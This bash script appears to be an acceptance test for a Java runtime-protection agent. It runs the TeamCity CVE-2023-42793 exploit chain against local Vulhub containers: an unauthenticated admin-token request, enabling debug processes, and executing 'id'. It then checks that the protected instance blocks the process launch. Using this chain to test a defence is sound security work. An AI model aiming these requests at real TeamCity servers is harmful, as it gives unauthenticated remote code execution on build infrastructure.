#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java17:agentJava17Jar

image="${OHMYRASP_VULHUB_TEAMCITY_42793_IMAGE:-vulhub/teamcity:2023.05.3}"
baseline_name="${OHMYRASP_VULHUB_TEAMCITY_42793_BASELINE_NAME:-ohmyrasp-vulhub-teamcity-42793-baseline}"
protected_name="${OHMYRASP_VULHUB_TEAMCITY_42793_PROTECTED_NAME:-ohmyrasp-vulhub-teamcity-42793-protected}"
baseline_port="${OHMYRASP_VULHUB_TEAMCITY_42793_BASELINE_PORT:-19272}"
protected_port="${OHMYRASP_VULHUB_TEAMCITY_42793_PROTECTED_PORT:-19273}"
host_agent_jar="$(pwd)/agent-java17/build/libs/ohmyrasp-agent-java17.jar"
baseline_dir="logs/vulhub-teamcity-2023-42793-java17-baseline"
protected_dir="logs/vulhub-teamcity-2023-42793-java17-protected"
payload_dir="logs/vulhub-teamcity-2023-42793-java17-payload"
protected_log="${protected_dir}/events.jsonl"
teamcity_opts="-Dteamcity.startup.maintenance=false -Dteamcity.firstStart.setupAdmin.enabled=false"

copy_artifacts() {
  local name="$1"
  local dir="$2"
  mkdir -p "$dir"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
  fi
}

cleanup() {
  copy_artifacts "$baseline_name" "$baseline_dir"
  copy_artifacts "$protected_name" "$protected_dir"
  docker rm -f -v "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

curl_status() {
  local output="$1"
  shift
  local status
  status="$(curl --max-time 30 -sS -o "$output" -w "%{http_code}" "$@" 2>"${output}.err" || true)"
  if [[ -z "$status" ]]; then
    status="000"
  fi
  printf "%s" "$status"
}

wait_for_teamcity() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status
  for attempt in $(seq 1 180); do
    status="$(curl_status "${dir}/ready-${attempt}.response" "http://127.0.0.1:${port}/login.html")"
    printf 'ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
    if [[ "$status" == "200" ]]; then
      return
    fi
    if ! docker ps --filter "name=${name}" --filter status=running --format '{{.Names}}' \
      | grep -Fq "$name"; then
      docker logs "$name" >&2 || true
      echo "TeamCity CVE-2023-42793 container ${name} stopped before readiness" >&2
      exit 1
    fi
    sleep 2
  done
  docker logs "$name" >&2 || true
  echo "TeamCity CVE-2023-42793 did not become ready at ${port}" >&2
  exit 1
}

verify_image_java17_lts() {
  docker run --rm "$image" java -version > "${payload_dir}/image-java-version.txt" 2>&1 || true
  if ! grep -Eq 'version "17\.' "${payload_dir}/image-java-version.txt" \
    || ! grep -Fq 'LTS' "${payload_dir}/image-java-version.txt"; then
    cat "${payload_dir}/image-java-version.txt" >&2 || true
    echo "TeamCity CVE-2023-42793 image did not report a Java 17 LTS runtime" >&2
    exit 1
  fi
}

extract_token() {
  local response="$1"
  sed -n 's/.*value="\([^"]*\)".*/\1/p' "$response"
}

create_rpc2_token() {
  local port="$1"
  local dir="$2"
  local status
  local token
  status="$(curl_status "${dir}/token.response" \
    -X POST "http://127.0.0.1:${port}/app/rest/users/id:1/tokens/RPC2")"
  token="$(extract_token "${dir}/token.response")"
  if [[ "$status" != "200" || -z "$token" ]]; then
    cat "${dir}/token.response" >&2 || true
    echo "TeamCity CVE-2023-42793 did not create the unauthenticated RPC2 token; status=${status}" >&2
    exit 1
  fi
  printf "%s" "$token" > "${dir}/token.txt"
}

enable_debug_processes() {
  local port="$1"
  local dir="$2"
  local token
  local status
  token="$(cat "${dir}/token.txt")"
  status="$(curl_status "${dir}/enable-debug.response" \
    -X POST \
    -H "Authorization: Bearer ${token}" \
    "http://127.0.0.1:${port}/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true")"
  if [[ "$status" != "200" ]]; then
    cat "${dir}/enable-debug.response" >&2 || true
    echo "TeamCity CVE-2023-42793 did not enable debug processes; status=${status}" >&2
    exit 1
  fi
}

run_debug_id() {
  local port="$1"
  local dir="$2"
  local token
  token="$(cat "${dir}/token.txt")"
  curl_status "${dir}/debug-id.response" \
    -X POST \
    -H "Authorization: Bearer ${token}" \
    "http://127.0.0.1:${port}/app/rest/debug/processes?exePath=id"
}

wait_for_baseline_debug_id() {
  local port="$1"
  local dir="$2"
  local status
  for attempt in $(seq 1 30); do
    status="$(run_debug_id "$port" "$dir")"
    printf 'debug_id_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
    if [[ "$status" == "200" ]] \
        && grep -Fq 'StdOut:uid=' "${dir}/debug-id.response" \
        && grep -Fq 'tcuser' "${dir}/debug-id.response"; then
      return
    fi
    if ! grep -Fq 'rest.debug.processes.enable' "${dir}/debug-id.response"; then
      break
    fi
    sleep 1
  done
  cat "${dir}/debug-id.response" >&2 || true
  echo "baseline TeamCity CVE-2023-42793 did not execute id through debug processes; status=${status}" >&2
  exit 1
}

detection_count() {
  grep -Fc '"event":"ohmyrasp-detection"' "$protected_log" 2>/dev/null || true
}

debug_process_block_count() {
  grep -Ec '"algorithm":"java17_request_debug_process_launch".*"action":"block"' \
    "$protected_log" 2>/dev/null || true
}

wait_for_protected_startup() {
  for attempt in $(seq 1 120); do
    if grep -Fq '"event":"ohmyrasp-java17-agent-start"' "$protected_log" \
      && grep -Fq '"request_hook":"installed"' "$protected_log"; then
      printf 'agent_start_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing Java 17 startup/request-hook marker for protected TeamCity" >&2
  exit 1
}

wait_for_debug_process_block() {
  local previous="$1"
  local count
  for attempt in $(seq 1 30); do
    count="$(debug_process_block_count)"
    if (( count > previous )); then
      printf 'debug_process_block_attempt=%s count=%s\n' "$attempt" "$count" \
        >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing java17_request_debug_process_launch block event for TeamCity CVE-2023-42793" >&2
  exit 1
}

run_baseline() {
  docker run -d --name "$baseline_name" \
    -p "${baseline_port}:8111" \
    -e "TEAMCITY_SERVER_OPTS=${teamcity_opts}" \
    "$image" >/dev/null

  wait_for_teamcity "$baseline_name" "$baseline_port" "$baseline_dir"
  create_rpc2_token "$baseline_port" "$baseline_dir"
  enable_debug_processes "$baseline_port" "$baseline_dir"
  wait_for_baseline_debug_id "$baseline_port" "$baseline_dir"
}

run_protected() {
  local status
  local before
  docker run -d --name "$protected_name" \
    -p "${protected_port}:8111" \
    -e "TEAMCITY_SERVER_OPTS=${teamcity_opts}" \
    -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java17.jar -Dohmyrasp.java17.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java17.block=true" \
    -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java17.jar:ro" \
    -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
    "$image" >/dev/null

  wait_for_teamcity "$protected_name" "$protected_port" "$protected_dir"
  wait_for_protected_startup
  if (( $(detection_count) != 0 )); then
    cat "$protected_log" >&2 || true
    echo "protected TeamCity CVE-2023-42793 emitted detections before exploit traffic" >&2
    exit 1
  fi

  status="$(curl_status "${protected_dir}/safe-login.response" \
    "http://127.0.0.1:${protected_port}/login.html")"
  if [[ "$status" != "200" ]] || (( $(detection_count) != 0 )); then
    cat "$protected_log" >&2 || true
    echo "protected TeamCity safe login request was not quiet" >&2
    exit 1
  fi

  create_rpc2_token "$protected_port" "$protected_dir"
  enable_debug_processes "$protected_port" "$protected_dir"
  if (( $(detection_count) != 0 )); then
    cat "$protected_log" >&2 || true
    echo "protected TeamCity token/debug setup emitted detections before process launch" >&2
    exit 1
  fi

  before="$(debug_process_block_count)"
  status="$(run_debug_id "$protected_port" "$protected_dir")"
  if [[ "$status" == "200" ]] && grep -Fq 'StdOut:uid=' "${protected_dir}/debug-id.response"; then
    cat "${protected_dir}/debug-id.response" >&2 || true
    echo "protected TeamCity CVE-2023-42793 still executed id through debug processes" >&2
    exit 1
  fi
  if grep -Fq 'StdOut:uid=' "${protected_dir}/debug-id.response"; then
    cat "${protected_dir}/debug-id.response" >&2 || true
    echo "protected TeamCity CVE-2023-42793 response leaked command output" >&2
    exit 1
  fi
  wait_for_debug_process_block "$before"
  if grep -Eq 'Bearer|eyJ|exePath=id' "$protected_log"; then
    cat "$protected_log" >&2
    echo "protected TeamCity CVE-2023-42793 log leaked token or raw executable query" >&2
    exit 1
  fi
}

rm -rf "$baseline_dir" "$protected_dir" "$payload_dir"
mkdir -p "$baseline_dir" "$protected_dir" "$payload_dir"
: > "$protected_log"
chmod 777 "$protected_dir"
chmod 666 "$protected_log"
docker rm -f -v "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
verify_image_java17_lts
run_baseline
run_protected

echo "Vulhub TeamCity CVE-2023-42793 Java 17 acceptance passed"
